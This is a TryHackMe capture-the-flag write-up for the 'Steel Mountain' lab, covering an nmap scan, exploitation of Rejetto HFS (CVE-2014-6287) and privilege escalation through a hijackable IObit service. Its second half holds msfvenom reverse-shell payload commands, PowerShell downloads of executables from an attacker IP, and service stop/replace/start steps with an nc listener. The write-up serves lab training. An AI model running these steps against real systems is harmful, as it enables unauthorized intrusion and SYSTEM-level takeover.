# Steel Mountain machine - TryHackMe
autor: Silvestre García

## NMAP
```
sudo nmap -sV 10.10.35.216
```
```
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
8080/tcp  open  http               HttpFileServer httpd 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```


## Exploitation

CVE: CVE-2014-6287

Metasploit module:
exploit/windows/http/rejetto_hfs_exec

**Exploit parameters**
```
Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  HTTPDELAY  10               no        Seconds to wait before terminating web se
                                        rver
  Proxies                     no        A proxy chain of format type:host:port[,t
                                        ype:host:port][...]
  RHOSTS     10.10.97.118     yes       The target host(s), see https://github.co
                                        m/rapid7/metasploit-framework/wiki/Using-
                                        Metasploit
  RPORT      80               yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to li
                                        sten on. This must be an address on the l
                                        ocal machine or 0.0.0.0 to listen on all
                                        addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connection
                                        s
  SSLCert                     no        Path to a custom SSL certificate (default
                                         is randomly generated)
  TARGETURI  /                yes       The path of the web application
  URIPATH                     no        The URI to use for this exploit (default
                                        is random)
  VHOST                       no        HTTP server virtual host

```

First flag: C:\Users\bill\Desktop>type user.txt

## Privilege escalation
Script to use: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

Load script: 
```
meterpreter > upload /home/bionicarm/Learning/THM/offensive-pentesting/steel-mountain/PowerUp.ps1 
```

Load powershell:
```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
```

Executing script:
```
.\PowerUp.ps1
Invoke-AllChecks
```
Output:

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files
```

**Creating exploit for privilege escalation and reverse shell:**
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.18.68.8 LPORT:4444 -f exe-service -e x86/shikata_ga_nai -o mamberroi.exe
```


## Exploiting and escalation without metasploit
Exploit used: https://www.exploit-db.com/exploits/39161

**Transfered file using Python http server**

### WinPEAS
Download file
```
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.18.68.8:80/winPEASx64.exe','winPEASx64.exe')
```
Important output:
```
�����������������������������������͹ Services Information �������������������������������������

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                    
    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected                                  
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])                                                                                            
    Advanced SystemCare Service
   =================================================================================================
```

### Exploit escalation using msfvenom
Transfer file:
```
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.18.68.8:80/ASCService.exe','ASCService.exe')
```

Stop service
```
sc stop AdvancedSystemCareService9
```

```

Create payload with msfvenom
```
msfvenom  -p windows/shell_reverse_tcp LHOST=10.18.68.8 LPORT=4545 -f exe-service -o ASCService.exe
```

Move malicious file to service folder
```
copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

Open listener
```
nc -lvnp 4545
```

Start service to run payload
```
sc start AdvancedSystemCareService9
```

"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"